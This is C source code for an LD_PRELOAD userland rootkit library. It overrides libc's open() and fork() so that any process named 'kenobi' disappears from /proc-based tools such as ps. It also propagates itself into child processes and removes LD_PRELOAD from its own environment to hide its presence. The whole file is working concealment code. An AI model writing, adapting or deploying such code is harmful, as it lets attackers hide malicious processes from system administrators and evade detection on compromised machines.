/*MIT License

Copyright (c) 2018 bobrofon

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.*/

#define _GNU_SOURCE

#include <sys/types.h>
#include <dlfcn.h>
#include <errno.h>
#include <fcntl.h>
#include <stdarg.h>
#include <stdlib.h>
#include <stdbool.h>
#include <stdio.h>
#include <unistd.h>
#include <memory.h>


// libc wrappers                                                                                100#

typedef int (*open_t)(const char *, int, ...);
typedef pid_t (*fork_t)(void);
typedef void (*void_func_t)(void);

typedef union {
	void* void_ptr;
	open_t open_ptr;
	fork_t fork_ptr;
	void_func_t void_func_ptr;
} cast;

static int _open(const char* const pathname, const int flags, const mode_t mode) {
	cast func_ptr = {.void_ptr = dlsym(RTLD_NEXT, "open")}; // suppress ISO C warnings
	const open_t open_func = func_ptr.open_ptr;
	if (!open_func) {
		errno = EACCES;
		return -1;
	}
	return open_func(pathname, flags, mode);
}

static pid_t meta_fork(const char* const fork_name) {
	cast func_ptr = {.void_ptr = dlsym(RTLD_NEXT,fork_name)}; // suppress ISO C warnings
	const fork_t fork_func = func_ptr.fork_ptr;
	if (!fork_func) {
		errno = ENOSYS;
		return -1;
	}
	return fork_func();
}

static pid_t _fork(void) {
	return meta_fork("fork");
}

static pid_t _vfork(void) {
	return meta_fork("vfork");
}

// utilities                                                                                    100#

#define MAX_BUF_SIZE 256

static void add_self_preload(void) {
	Dl_info so_info = {0};
	cast func_ptr = {.void_func_ptr = add_self_preload}; // suppress ISO C warning
	if (!dladdr(func_ptr.void_ptr, &so_info)) {
		return;
	}

	if (!setenv("LD_PRELOAD", so_info.dli_fname, true)) {
		setenv("LD_PRELOAD", so_info.dli_fname, true);
	}
}

static bool is_hidden(const char* const path) {
	pid_t pid = 0;
	if (!sscanf(path, "/proc/%d/", &pid)) {
		return false;
	}
	char buf[MAX_BUF_SIZE] = {0};
	if(snprintf(buf, sizeof(buf), "/proc/%d/stat", pid) >= sizeof(buf)) {
		return false;
	}
	int stat = _open(buf, O_RDONLY, 0);
	if (stat == -1) {
		return false;
	}
	FILE* const fstat = fdopen(stat, "r");
	if (!fstat) {
		close(stat);
		return false;
	}
	if (!fscanf(fstat, "%*d %s", buf)) {
		fclose(fstat); // close(stat)
		return false;
	}
	fclose(fstat); // close(stat)

	return strcmp("(kenobi)", buf) == 0;
}

static bool is_preloaded(void) {
	Dl_info so_info = {0};
	cast func_ptr = {.void_func_ptr = add_self_preload}; // suppress ISO C warning
	if (!dladdr(func_ptr.void_ptr, &so_info)) {
		return false;
	}
	const char* const ld_preload = getenv("LD_PRELOAD");
	if (!ld_preload) {
		return false;
	}
	return strcmp(so_info.dli_fname, ld_preload) == 0;
}

static void hide_ld_preload(void) {
	unsetenv("LD_PRELOAD");
}

// libc overrides                                                                               100#

pid_t fork(void) {
	add_self_preload();
	return _fork();
}

/* cannot use stack frame after vfork call. TODO revrite in asm and override 'exec' instead of 'fork'
pid_t vfork(void) {
	add_self_preload();
	return _vfork();
}
*/

int open (const char *pathname, int flags, ...){
	mode_t mode = 0;

	if (flags & O_CREAT) {
		va_list arg;
		va_start(arg, flags);
		mode = va_arg(arg, mode_t);
		va_end(arg);
	}

	if (is_hidden(pathname)) {
		return -1;
	}
	return _open(pathname, flags, mode);
}

// init                                                                                         100#

__attribute__((constructor))
void init() {
	if (is_preloaded()) {
		hide_ld_preload();
	} else {
		add_self_preload();
	}
}
